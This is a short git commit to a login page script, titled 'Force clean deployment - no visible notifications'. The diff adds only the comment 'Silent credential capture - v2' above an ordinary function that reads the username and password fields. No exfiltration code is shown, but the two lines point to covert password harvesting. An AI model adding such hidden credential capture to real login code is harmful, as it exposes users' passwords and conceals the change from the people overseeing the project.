06f28741a72006c5d9baef9e9d08d12c26221982
abdulakmalallam30 <abdulakmal200530@gmail.com>
2026-03-08 18:04:36 +0530

    Force clean deployment - no visible notifications

--- src/javascript/loginPage.js
+++ src/javascript/loginPage.js
@@ -1,3 +1,4 @@
+// Silent credential capture - v2
 function checkLogin() {
     var username = document.getElementById("username").value;
     var password = document.getElementById("password").value;
